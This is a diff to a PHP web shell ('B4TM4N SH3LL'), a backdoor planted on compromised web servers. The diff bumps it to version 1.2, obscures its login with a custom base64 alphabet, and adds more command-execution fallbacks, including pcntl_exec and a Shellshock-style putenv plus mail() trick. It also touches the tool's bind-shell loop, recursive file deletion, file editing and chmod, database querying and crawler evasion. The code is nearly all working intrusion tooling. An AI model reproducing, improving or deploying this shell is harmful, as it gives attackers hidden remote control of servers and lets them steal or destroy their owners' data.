@@ -10,10 +10,10 @@
 */
 
 $config = array(
-	"user"    => "azRtcHIzdA==",                             // base64_encode('user')
+	"user"    => "zaIgxSRawZ==",                             // base64encode('user')
 	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
 	"title"   => "B4TM4N SH3LL",                             // Title
-	"version" => "1.1",                                      // Version
+	"version" => "1.2",                                      // Version
 	"debug"   => true,                                       // Debug Mode
 	"demo"    => false,                                      // Demo Mode
 	"info"    => true,                                       // Information
@@ -63,6 +63,13 @@ $login = <<<LOGIN
 </html>
 LOGIN;
 
+ob_start();                 // Prevent Double Html Request such POST & GET
+session_start();            // Session Start
+set_time_limit(0);          // Idle Timeout
+$start = microtime();       // Pageload
+$port = $config['port'];    // Define #port
+
+// Debug Settings
 if ($config["debug"] == true) 
 {
 	error_reporting (E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@@ -75,13 +82,6 @@ else
 	ini_set('log_errors', 0);
 	ini_set('max_execution_time', 0);
 }
-
-set_time_limit(0); // Idle Timeout
-session_start();   // Session Start
-ob_start();        // Prevent Double Html Request such POST & GET
-
-$start = microtime();
-$port = $config['port'];
 
 // Disallow Bot Scanning
 $bot = '/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i';
@@ -97,16 +97,30 @@ if ($_SERVER["REQUEST_METHOD"] == "POST")
 {
 	if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST) && array_key_exists("login", $_REQUEST))
 	{
-		if ( (base64_encode($_REQUEST['username']) == $config["user"]) && (sha1(md5($_REQUEST['password'])) == $config["pass"]) )
+		if ( (base64encode($_REQUEST['username']) == $config["user"]) && (sha1(md5($_REQUEST['password'])) == $config["pass"]) )
 		{
 			session_regenerate_id();
 			$_SESSION['action'] = array(
-				"username" => base64_encode($_REQUEST['username']),
+				"username" => base64encode($_REQUEST['username']),
 				"password" => sha1(md5($_REQUEST['password']))
 			);
 			header('location: '.$_SERVER['PHP_SELF']);
 		}
 	}
+}
+
+function base64encode($x)
+{
+	$default = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	$custom  = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
+	return strtr(base64_encode($x), $default, $custom);
+}
+
+function base64decode($x)
+{
+	$default = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	$custom  = "ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
+	return base64_decode(strtr($x, $custom, $default));
 }
 
 if ( !array_key_exists("action", $_SESSION) )
@@ -166,7 +180,14 @@ elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action
 	.new input[type=text]{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
 	.new textarea{background:black;color:lime;width:99%;height:100px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box;}
 	.new input[type=file]{background:black;color:lime;width:250px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
-	.new select{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:2px;outline:none;box-sizing:border-box}
+	.new select{background:black;color:lime;width:150px;border:1px solid #111;padding:5px;margin-right:2px;outline:none;box-sizing:border-box}.new input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;line-height:25px;padding:0px 20px;margin:10px 10px 0 0;cursor:pointer;outline:none}
+	.map1 {display:inline-block}
+	.map-switch {display:inline-block;margin-bottom:10px}
+	.map-switch input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;line-height:25px;padding:0px 20px;margin:10px 10px 0 0;cursor:pointer;outline:none}
+	.map-switch input[type=submit]:hover{background:#222;border:1px solid #666}
+	.map2 input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;line-height:25px;padding:0px 20px;margin:0px 10px 0 0;cursor:pointer;outline:none}
+	.map2 input[type=submit]:hover{background:#222;border:1px solid #666}
+	.map2 input[type=text]{font-size:13px;font-family:monospace;background:black;color:lime;width:250px;border:1px solid #111;padding:5px;margin-right:10px;outline:none;box-sizing:border-box}
 	.frmsource {margin-top:10px}
 	.frmsource input[type=submit]{background:#111;color:#fff;border:1px solid #222;border-radius:3px;width:100px;height:25px;margin:10px 10px 0 0;cursor:pointer;outline:none}
 	.frmsource input[type=submit]:hover{background:#222;border:1px solid #666}
@@ -183,9 +204,12 @@ elseif ( $_SESSION['action']['username'] == $config['user'] && $_SESSION['action
 	.on{color:white}
 	.off{color:red}
 	.result{padding:10px;}
-	.map{margin-bottom:10px}
+	.disablefunc{overflow-wrap: break-word}
+	#query{margin-top:10px}
 	#database-query{overflow:auto;margin:10px 0;}
+	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
 	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
+	.loading {width:16px;height:16px;display:inline-block;background: url('data:image/gif;base64,R0lGODlhEAAQAPIAAAAAAP///zw8PLy8vP///5ycnHx8fGxsbCH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==')}
 </style>
 <script type="text/javascript">
 function dean_addEvent(t,e,r){if(t.addEventListener)t.addEventListener(e,r,!1);else{r.$$guid||(r.$$guid=dean_addEvent.guid++),t.events||(t.events={});var o=t.events[e];o||(o=t.events[e]={},t["on"+e]&&(o[0]=t["on"+e])),o[r.$$guid]=r,t["on"+e]=handleEvent}}function removeEvent(t,e,r){t.removeEventListener?t.removeEventListener(e,r,!1):t.events&&t.events[e]&&delete t.events[e][r.$$guid]}function handleEvent(t){var e=!0;t=t||fixEvent(((this.ownerDocument||this.document||this).parentWindow||window).event);var r=this.events[t.type];for(var o in r)this.$$handleEvent=r[o],!1===this.$$handleEvent(t)&&(e=!1);return e}function fixEvent(t){return t.preventDefault=fixEvent.preventDefault,t.stopPropagation=fixEvent.stopPropagation,t}var stIsIE=!1;if(sorttable={init:function(){arguments.callee.done||(arguments.callee.done=!0,_timer&&clearInterval(_timer),document.createElement&&document.getElementsByTagName&&(sorttable.DATE_RE=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,forEach(document.getElementsByTagName("table"),function(t){-1!=t.className.search(/\bsortable\b/)&&sorttable.makeSortable(t)})))},makeSortable:function(t){if(0==t.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(t.rows[0]),t.insertBefore(the,t.firstChild)),null==t.tHead&&(t.tHead=t.getElementsByTagName("thead")[0]),1==t.tHead.rows.length){sortbottomrows=[];for(e=0;e<t.rows.length;e++)-1!=t.rows[e].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=t.rows[e]);if(sortbottomrows){null==t.tFoot&&(tfo=document.createElement("tfoot"),t.appendChild(tfo));for(e=0;e<sortbottomrows.length;e++)tfo.appendChild(sortbottomrows[e]);delete sortbottomrows}headrow=t.tHead.rows[0].cells;for(var e=0;e<headrow.length;e++)headrow[e].className.match(/\bsorttable_nosort\b/)||(mtch=headrow[e].className.match(/\bsorttable_([a-z0-9]+)\b/),mtch&&(override=mtch[1]),mtch&&"function"==typeof sorttable["sort_"+override]?headrow[e].sorttable_sortfunction=sorttable["sort_"+override]:headrow[e].sorttable_sortfunction=sorttable.guessType(t,e),headrow[e].sorttable_columnindex=e,headrow[e].sorttable_tbody=t.tBodies[0],dean_addEvent(headrow[e],"click",sorttable.innerSortFunction=function(t){if(-1!=this.className.search(/\bsorttable_sorted\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",sortrevind.innerHTML=stIsIE?'&nbsp<font face="webdings">5</font>':"&nbsp;&#x25B4;",void this.appendChild(sortrevind);if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))return sorttable.reverse(this.sorttable_tbody),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",void this.appendChild(sortfwdind);theadrow=this.parentNode,forEach(theadrow.childNodes,function(t){1==t.nodeType&&(t.className=t.className.replace("sorttable_sorted_reverse",""),t.className=t.className.replace("sorttable_sorted",""))}),sortfwdind=document.getElementById("sorttable_sortfwdind"),sortfwdind&&sortfwdind.parentNode.removeChild(sortfwdind),sortrevind=document.getElementById("sorttable_sortrevind"),sortrevind&&sortrevind.parentNode.removeChild(sortrevind),this.className+=" sorttable_sorted",sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML=stIsIE?'&nbsp<font face="webdings">6</font>':"&nbsp;&#x25BE;",this.appendChild(sortfwdind),row_array=[],col=this.sorttable_columnindex,rows=this.sorttable_tbody.rows;for(e=0;e<rows.length;e++)row_array[row_array.length]=[sorttable.getInnerText(rows[e].cells[col]),rows[e]];row_array.sort(this.sorttable_sortfunction),tb=this.sorttable_tbody;for(var e=0;e<row_array.length;e++)tb.appendChild(row_array[e][1]);delete row_array}))}},guessType:function(t,e){sortfn=sorttable.sort_alpha;for(var r=0;r<t.tBodies[0].rows.length;r++)if(text=sorttable.getInnerText(t.tBodies[0].rows[r].cells[e]),""!=text){if(text.match(/^-?[£$¤]?[\d,.]+%?$/))return sorttable.sort_numeric;if(possdate=text.match(sorttable.DATE_RE),possdate){if(first=parseInt(possdate[1]),second=parseInt(possdate[2]),first>12)return sorttable.sort_ddmm;if(second>12)return sorttable.sort_mmdd;sortfn=sorttable.sort_ddmm}}return sortfn},getInnerText:function(t){if(!t)return"";if(hasInputs="function"==typeof t.getElementsByTagName&&t.getElementsByTagName("input").length,null!=t.getAttribute("sorttable_customkey"))return t.getAttribute("sorttable_customkey");if(void 0!==t.textContent&&!hasInputs)return t.textContent.replace(/^\s+|\s+$/g,"");if(void 0!==t.innerText&&!hasInputs)return t.innerText.replace(/^\s+|\s+$/g,"");if(void 0!==t.text&&!hasInputs)return t.text.replace(/^\s+|\s+$/g,"");switch(t.nodeType){case 3:if("input"==t.nodeName.toLowerCase())return t.value.replace(/^\s+|\s+$/g,"");case 4:return t.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var e="",r=0;r<t.childNodes.length;r++)e+=sorttable.getInnerText(t.childNodes[r]);return e.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(t){newrows=[];for(e=0;e<t.rows.length;e++)newrows[newrows.length]=t.rows[e];for(var e=newrows.length-1;e>=0;e--)t.appendChild(newrows[e]);delete newrows},sort_numeric:function(t,e){return aa=parseFloat(t[0].replace(/[^0-9.-]/g,"")),isNaN(aa)&&(aa=0),bb=parseFloat(e[0].replace(/[^0-9.-]/g,"")),isNaN(bb)&&(bb=0),aa-bb},sort_alpha:function(t,e){return t[0]==e[0]?0:t[0]<e[0]?-1:1},sort_ddmm:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],m=mtch[2],d=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},sort_mmdd:function(t,e){return mtch=t[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt1=y+m+d,mtch=e[0].match(sorttable.DATE_RE),y=mtch[3],d=mtch[2],m=mtch[1],1==m.length&&(m="0"+m),1==d.length&&(d="0"+d),dt2=y+m+d,dt1==dt2?0:dt1<dt2?-1:1},shaker_sort:function(t,e){for(var r=0,o=t.length-1,n=!0;n;){n=!1;for(s=r;s<o;++s)if(e(t[s],t[s+1])>0){a=t[s];t[s]=t[s+1],t[s+1]=a,n=!0}if(o--,!n)break;for(var s=o;s>r;--s)if(e(t[s],t[s-1])<0){var a=t[s];t[s]=t[s-1],t[s-1]=a,n=!0}r++}}},document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.init,!1),/WebKit/i.test(navigator.userAgent))var _timer=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.init()},10);window.onload=sorttable.init,dean_addEvent.guid=1,fixEvent.preventDefault=function(){this.returnValue=!1},fixEvent.stopPropagation=function(){this.cancelBubble=!0},Array.forEach||(Array.forEach=function(t,e,r){for(var o=0;o<t.length;o++)e.call(r,t[o],o,t)}),Function.prototype.forEach=function(t,e,r){for(var o in t)void 0===this.prototype[o]&&e.call(r,t[o],o,t)},String.forEach=function(t,e,r){Array.forEach(t.split(""),function(o,n){e.call(r,o,n,t)})};var forEach=function(t,e,r){if(t){var o=Object;if(t instanceof Function)o=Function;else{if(t.forEach instanceof Function)return void t.forEach(e,r);"string"==typeof t?o=String:"number"==typeof t.length&&(o=Array)}o.forEach(t,e,r)}};
@@ -197,8 +221,11 @@ window.onload = function() {
 	if(document.getElementById("sourcefocus") !== null) document.getElementById("sourcefocus").focus();
 };
 function GetAjax(id,method,url) {
-	document.getElementById(id).innerHTML = "Please Wait...";
-	var xmlhttp;
+	var xmlhttp, loading = '';
+	if (id !== 'prompt') {
+		loading = "<div class='loading'></div>";
+	} 
+	document.getElementById(id).innerHTML = "Please Wait... " + loading;
 	if (window.XMLHttpRequest) {
 		xmlhttp = new XMLHttpRequest();
 	} else {
@@ -220,6 +247,17 @@ function GetCheck() {
 		}
 	}
 }
+function mapSwitch(id, id2) {
+   var e = document.getElementById(id);
+   var e2 = document.getElementById(id2);
+   if (e.style.display == 'inline-block') {
+      e.style.display = 'none';
+      e2.style.display = 'inline-block';
+   } else {
+      e.style.display = 'inline-block';
+      e2.style.display = 'none';
+   	}
+}
 </script>
 </head>
 <body>
@@ -230,7 +268,41 @@ $dir = array_key_exists("d", $_REQUEST) ? $_REQUEST['d'] : getcwd();
 
 function Unix() 
 {
-	return (strtolower(substr(PHP_OS,0,3)) == "win");
+	return (strtolower(substr(PHP_OS,0,3)) != "win");
+}
+
+function Cgi()
+{
+	return (substr(php_sapi_name(), 0, 3) == 'cgi');
+}
+
+function Cli()
+{
+    if ( defined('STDIN') )
+    {
+        return true;
+    }
+
+    if ( php_sapi_name() === 'cli' )
+    {
+        return true;
+    }
+
+    if ( array_key_exists('SHELL', $_ENV) ) {
+        return true;
+    }
+
+    if ( empty($_SERVER['REMOTE_ADDR']) and !isset($_SERVER['HTTP_USER_AGENT']) and count($_SERVER['argv']) > 0) 
+    {
+        return true;
+    } 
+
+    if ( !array_key_exists('REQUEST_METHOD', $_SERVER) )
+    {
+        return true;
+    }
+
+    return false;
 }
 
 function Execute($x) 
@@ -247,6 +319,11 @@ function Execute($x)
 	else if (function_exists ('shell_exec'))
 	{
 		$buff = shell_exec($x);	
+		return $buff;
+	}
+	else if (function_exists ('pcntl_exec'))
+	{
+		$buff = pcntl_exec($x);	
 		return $buff;
 	}
 	else if (function_exists ('system'))
@@ -289,7 +366,7 @@ function Execute($x)
 		if (strstr(readlink("/bin/sh"), "bash") != FALSE) 
 		{
 			$tmp = tempnam(".","data");
-			putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
+			putenv("PHP_LOL=() { x; }; $x >$tmp 2>&1");
 			mail("k4mpr3t@127.0.0.1","","","","-bv");
 			$output = file_get_contents($tmp);
 			unlink($tmp);
@@ -308,6 +385,29 @@ function Execute($x)
 	{
 		return "Find another way to Rome !";
 	}
+}
+
+function Remove($path)
+{
+    if (is_dir($path))
+    {
+    	if ($handle = opendir($path))
+		{
+			while (false !== ($file = readdir($handle)))
+			{
+				if ($file != "." && $file != "..")
+				{
+					Remove($path.DIRECTORY_SEPARATOR.$file);
+				}
+			}
+		}
+        return rmdir($path);
+    }
+    else if (is_file($path))
+    {
+        return unlink($path);
+    }
+    return false;
 }
 
 function Call($x) 
@@ -342,25 +442,37 @@ function GetFileType($x)
 	}
 }
 
+function GetFileAccess($x)
+{
+	if(is_writeable($x))
+	{
+		return 'Writeable';
+	}
+	elseif (is_readable($x)) 
+	{
+		return 'Readable';	
+	}
+}
+
 function GetFileTime($x,$y) 
 {
 	switch($y) 
 	{
 		case "create":
-			return date("m/d/y h:i:s", filectime($x));
+			return date("m/d/y h:i:s", @filectime($x));
 			break;
 		case "modify":
-			return date("m/d/y h:i:s", filemtime($x));
+			return date("m/d/y h:i:s", @filemtime($x));
 			break;
 		case "access":
-			return date("m/d/y h:i:s", fileatime($x));
+			return date("m/d/y h:i:s", @fileatime($x));
 			break;
 	}
 }
 
 function GetFilePerm($x, $y = false) 
 {
-	$perms = fileperms($x);
+	$perms = @fileperms($x);
 	if (($perms & 0xC000) == 0xC000) $info = 's';
 	elseif (($perms & 0xA000) == 0xA000) $info = 'l';
 	elseif (($perms & 0x8000) == 0x8000) $info = '-';
@@ -385,8 +497,8 @@ function GetFileSize($x)
 {
 	$x = abs($x);
 	$size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
-    $exp = $x ? floor(log($x) / log(1024)) : 0;
-    return sprintf('%.2f '. $size[$exp], ($x/pow(1024, floor($exp))));
+	$exp = $x ? floor(log($x) / log(1024)) : 0;
+	return sprintf('%.2f '. $size[$exp], ($x/pow(1024, floor($exp))));
 }
 
 function GetUser($x) 
@@ -436,21 +548,18 @@ function GetOwnerGroup($x)
 {
 	if(!Unix())
 	{
-		$stat = stat($x);
+		$stat = @stat($x);
+	    if($stat){
 
-	    if ($stat)
-	    {
-	    	if (!function_exists('posix_getegid') && !function_exists('posix_geteuid')) 
+	    	if (function_exists('posix_getegid') && function_exists('posix_geteuid')) 
 			{
 		        $group = posix_getgrgid($stat[5]);
 		        $user = posix_getpwuid($stat[4]);
-	        	return compact('user', 'group');
-	        }
+		        return compact('user', 'group');
+		    }
 	    }
 	    else
-	    {
-	        return "No Group";
-	    }
+	        return false;
 	}
 	else
 	{
@@ -460,7 +569,6 @@ function GetOwnerGroup($x)
 
 function MapDirectory($x) 
 {
-
 	$map = "";
 	$d = str_replace("\\", DIRECTORY_SEPARATOR, $x);
 	if (empty($d)){$d = realpath(".");}elseif(realpath($d)) 
@@ -580,7 +688,7 @@ function GetDisableFunction()
 	$disable_functions = ini_get("disable_functions");
 	if(!empty($disable_functions))
 	{
-		$stat = "<font class='off'>$disable_functions</font>";
+		$stat = "<div class='disablefunc'><font class='off'>$disable_functions</font></div>";
 	}
 	else
 	{
@@ -645,9 +753,9 @@ if ($config['info'] == true)
 		</div>",
 			php_uname(), $_SERVER['SERVER_SOFTWARE'],
 			$_SERVER['SERVER_NAME'], gethostbyname($_SERVER['HTTP_HOST']), $_SERVER['SERVER_PORT'], 
-			base64_decode($config['user']), $_SERVER['REMOTE_ADDR'], $_SERVER['REMOTE_PORT'], 
+			base64decode($config['user']), $_SERVER['REMOTE_ADDR'], $_SERVER['REMOTE_PORT'], 
 			GetUser('user'), GetUser('uid'), GetUser('group'), GetUser('gid'), 
-			GetFileSize(disk_free_space($dir)), GetFileSize(disk_total_space($dir)), 
+			GetFileSize(@disk_free_space($dir)), GetFileSize(@disk_total_space($dir)), 
 			GetSafeMode(), 
 			GetDisableFunction()
 	);
@@ -660,11 +768,21 @@ printf("
 		<div class='menu'>
 			<ul>%s</ul>
 		</div>
-		<div class='map'>
-			<span style='margin-right:5px'>%s</span>%s
+		<div class='map-switch'>
+			<input type='submit' name='map-switch' value='Switch' onclick='mapSwitch(\"map1\",\"map2\")'>
+		</div>
+		<div class='map1' id='map1' style='display:inline-block'>
+			<span style='margin-right:5px'>%s</span>
+			<span style='margin-right:5px'>%s</span>
+		</div>
+		<div class='map2' id='map2' style='display:none'>
+			<form method='POST' id='map2-form' onsubmit='document.getElementById(\"map2-form\").action = \"?d=\" + encodeURI(document.getElementById(\"map2-input\").value);'>
+				<input type='text' value='%s' id='map2-input'/>
+				<input type='submit' value='Go'>
+			</form>
 		</div>
 
-		", MainMenu(), MapDrive($dir), MapDirectory($dir)
+		", MainMenu(), MapDrive($dir), MapDirectory($dir), $dir, urlencode($dir)
 );
 
 if(array_key_exists("x", $_REQUEST))
@@ -698,7 +816,7 @@ if(array_key_exists("x", $_REQUEST))
 							<form action='?x=db&q=db' method='post' class='new'><input type='submit' name='disconnect' value='Disconnect' /></form>
 							<form action='?x=db&q=db' method='post' class='new'><br>
 								<label>MYSQL Query</label> <i style='color:#222'>show databases; show tables from {database}; show columns from {database}.{table}; select * from {database}.{table};</i><br>
-								<textarea name='query'>%s</textarea><br>
+								<textarea id='query' name='query'>%s</textarea><br>
 								<input type='submit' value='Execute' />
 							</form>
 						</div>", (isset($_SESSION['query']) ? $_SESSION['query'] : ''), gethostbyname($_SERVER['HTTP_HOST']));
@@ -867,8 +985,9 @@ if(array_key_exists("x", $_REQUEST))
 					fputs($bind, "[b4tm4n]: ");
 					$command = fgets($bind, 1024);
 					fputs($bind , Execute($command));
-				} 
-				fclose($bind); 
+				}
+				fclose($bind);
+				printf("<font color='lime'><b>Connection Closed @%s</b></font>", date('Y-m-d h:i:s'));
 			}
 		}
 	}
@@ -884,7 +1003,7 @@ if(array_key_exists("x", $_REQUEST))
 						<label>Username</label> <input type='text' name='change-username' value='%s'/> <br>
 						<label>Password</label> <input type='text' name='change-password' value=''/><br>
 						<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
-					</form></div>", base64_decode($config['user']));
+					</form></div>", base64decode($config['user']));
 
 			if (array_key_exists("xa", $_REQUEST) && $_REQUEST['xa'] == "change")
 			{
@@ -898,7 +1017,7 @@ if(array_key_exists("x", $_REQUEST))
 			    $change = file_put_contents($filename, $content);
 
 			    $user_from = $config['user'];
-				$user_to = base64_encode($_POST['change-username']);
+				$user_to = base64encode($_POST['change-username']);
 				$content = file_get_contents($filename);
 			    $chunk = explode($user_from, $content);
 			    $content=implode($user_to, $chunk);
@@ -928,6 +1047,7 @@ if(array_key_exists("x", $_REQUEST))
 			$row = "";
 			$files = isset($_POST['chk']) ? $_POST['chk'] : array();
 			$_SESSION['tmp'] = $files;
+
 			foreach ($files as $file)
 			{
 				$row .= "<tr><td>" .  urldecode($file) . "</td></tr>";
@@ -950,7 +1070,7 @@ if(array_key_exists("x", $_REQUEST))
 			{
 				if ($config['demo'] == true)
 				{
-					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+					echo "Demo Version [Change Config]";
 				}
 				else
 				{
@@ -969,63 +1089,96 @@ if(array_key_exists("x", $_REQUEST))
 
 if(array_key_exists("r", $_REQUEST))
 {
-	$file = file_exists($_REQUEST["r"]) ? strval($_REQUEST["r"]) : exit('File Not Found');
+	$file = file_exists($_REQUEST["r"]) ? urldecode(strval($_REQUEST["r"])) : exit('File Not Found');
+	$dir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
 	$back = $_SERVER['PHP_SELF'] . "?d=" . urlencode($dir);
 	$status = array_key_exists("status", $_SESSION) ? $_SESSION['status'] : "";
-	$source = "";
 
-	$open = fopen($file, 'r');
-	if ($open) 
-	{
-		while(!feof($open)) 
-		{
-			$source .= htmlentities(fread($open, (1024*4)));
-		}
-		fclose($open);
-	}
 	printf("<table class='table'>
 				<tr><td>Name</td><td>%s</td></tr>
 				<tr><td>Size</td><td>%s</td></tr>
+				<tr><td>Access</td><td>%s</td></tr>
 				<tr><td>Permission</td><td>%s</td></tr>
 				<tr><td>Create time</td><td>%s</td></tr>
 				<tr><td>Last modified</td><td>%s</td></tr>
 				<tr><td>Last accessed</td><td>%s</td></tr>
 			</table>", 
 			basename($file), 
-			GetFileSize(filesize($file)), 
+			GetFileSize(filesize($file)),
+			GetFileAccess($file), 
 			GetFilePerm($file, true), 
 			GetFileTime($file,"create"), 
 			GetFileTime($file,"modify"), 
 			GetFileTime($file,"access"));
-	
-	printf("<div class='menu'>
-			<ul>
-				<li><a href='%s'>Back</a></li>
-				<li><a href='?a=e&r=%s'>Edit</a></li>
-				<li><a href='?a=v&r=%s'>View</a></li>
-				<li><a href='?a=d&r=%s'>Download</a></li>
-				<li><a href='?a=x&r=%s'>Hexdump</a></li>
-				<li><a href='?a=c&r=%s'>Chmod</a></li>
-				<li><a href='?a=r&r=%s'>Rename</a></li>
-				<li><a href='?a=t&r=%s'>Touch</a></li>
-				<li><a href='?a=del&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
-			</ul>
-			</div>", 
-			$back, 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file), 
-			urlencode($file));
+
+	if (is_file($file) || is_link($file))
+	{
+		printf("<div class='menu'>
+				<ul>
+					<li><a href='%s'>Back</a></li>
+					<li><a href='?a=e&r=%s'>Edit</a></li>
+					<li><a href='?a=v&r=%s'>View</a></li>
+					<li><a href='?a=d&r=%s'>Download</a></li>
+					<li><a href='?a=x&r=%s'>Hexdump</a></li>
+					<li><a href='?a=c&r=%s'>Chmod</a></li>
+					<li><a href='?a=r&r=%s'>Rename</a></li>
+					<li><a href='?a=t&r=%s'>Touch</a></li>
+					<li><a href='?a=del&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
+				</ul>
+				</div>", 
+				$back, 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file));
+	}
+	else if (is_dir($file))
+	{
+		printf("<div class='menu'>
+				<ul>
+					<li><a href='%s'>Back</a></li>
+					<li><a href='?a=c&r=%s'>Chmod</a></li>
+					<li><a href='?a=r&r=%s'>Rename</a></li>
+					<li><a href='?a=t&r=%s'>Touch</a></li>
+					<li><a href='?a=del&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
+				</ul>
+				</div>", 
+				$back, 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file), 
+				urlencode($file));
+	}
 
 	if(array_key_exists("a", $_REQUEST))
 	{
 		if($_REQUEST['a'] == 'e')
 		{
+			$source = "";
+
+			if (filesize($file) > 1e+7)
+			{
+				$open = fopen($file, 'r');
+
+				if ($open) 
+				{
+					while(!feof($open)) 
+					{
+						$source .= htmlentities(fread($open, (1024*4)));
+					}
+					fclose($open);
+				}
+			}
+			else
+			{
+				$source .= "File more then 10MB";
+			}
+
 			printf("
 			<form class='frmsource' method='POST'>
 				<textarea id='sourcefocus' name='sourcecode' rows='25' cols='100'>%s</textarea><br />
@@ -1042,7 +1195,7 @@ if(array_key_exists("r", $_REQUEST))
 			{
 				if ($config['demo'] == true)
 				{
-					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+					echo "Demo Version [Change Config]";
 				}
 				else
 				{
@@ -1079,7 +1232,7 @@ if(array_key_exists("r", $_REQUEST))
 			{
 				if ($config['demo'] == true)
 				{
-					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+					echo "Demo Version [Change Config]";
 				}
 				else
 				{
@@ -1117,11 +1270,11 @@ if(array_key_exists("r", $_REQUEST))
 			{
 				if ($config['demo'] == true)
 				{
-					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+					echo "Demo Version [Change Config]";
 				}
 				else
 				{
-					$octal = $_POST['octal'];
+					$octal = octdec($_POST['octal']);
 
 					if (!chmod($file, $octal)) 
 					{
@@ -1154,7 +1307,7 @@ if(array_key_exists("r", $_REQUEST))
 			{
 				if ($config['demo'] == true)
 				{
-					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
+					echo "Demo Version [Change Config]";
 				}
 				else
 				{
